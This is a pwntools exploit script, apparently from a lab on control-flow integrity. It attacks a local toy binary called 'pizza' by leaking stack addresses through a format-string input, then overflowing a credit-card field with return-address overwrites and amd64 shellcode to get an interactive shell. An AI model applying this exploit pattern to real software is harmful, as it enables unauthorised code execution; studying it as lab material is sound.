# Control Flow Integrity Violation


### Code

```
from pwn import *

binary = ELF('./pizza')
context(arch='amd64', os='linux', endian='little', word_size=64)

shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
print("shellcode size: " + str(len(shellcode)))

input1 = b'%p ' * 15

# Start the program
p = process('./pizza')
print(str(p.recvline(), "latin-1"))
#p.sendline(b"Bruce")
p.sendline(input1)
leak = str(p.recvline(), "latin-1")
print(leak)
leak = leak.split(' ')

# number of pizza input
p.sendline(b"1")
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))

return_addr = p64(int(leak[7], 16))
return_addr_1 = p64(int(leak[7], 16) + 0x20)

# credit card input
#payload = b'A' * 128 + b'CCCCCCCC' + return_addr + shellcode
payload = b'A' * 128 + return_addr + return_addr_1 + shellcode

#print(hex(id(return_addr)))
#print(payload)
#print(len(payload))

# card number payload
p.sendline(payload)

print(str(p.recvline(), "latin-1"))
#print(str(p.recvline(), "latin-1"))

#p.wait()
p.interactive()

'''
core = p.corefile
rsp = core.rsp
rbp = core.rbp
rip = core.rip

print(f"rsp: {hex(rsp)}")
print(f"rbp: {hex(rbp)}")
print(f"rip: {hex(rip)}")

top_of_stack = core.read(rsp, 8)
top_of_stack_1 = core.read(rsp+8, 8)
top_of_stack_2 = core.read(rsp+16, 8)
print(f"top of stack: {top_of_stack.hex()}")
print(f"top of stack 1: {top_of_stack_1.hex()}")
print(f"top of stack 2: {top_of_stack_2.hex()}")

'''

```

